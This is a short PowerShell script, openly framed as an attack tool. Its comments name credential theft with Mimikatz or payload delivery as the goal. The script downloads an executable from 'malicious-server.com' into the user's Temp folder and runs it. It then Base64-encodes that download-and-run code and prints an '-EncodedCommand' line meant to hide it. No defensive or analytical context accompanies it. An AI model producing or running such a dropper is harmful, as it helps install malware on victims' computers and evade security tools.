# Original PowerShell Script (for example, to steal credentials using Mimikatz or download a payload)
$script = @"
$UserName = $env:UserName
$URL = "http://malicious-server.com/payload.exe"
$Destination = "C:\Users\$UserName\AppData\Local\Temp\payload.exe"
Invoke-WebRequest -Uri $URL -OutFile $Destination
Start-Process -FilePath $Destination
"@

# Encode the script in Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64 = [Convert]::ToBase64String($bytes)

# Obfuscated PowerShell Command to execute the encoded script
$obfuscatedCommand = "powershell -EncodedCommand $base64"

# Output the obfuscated command
Write-Output $obfuscatedCommand
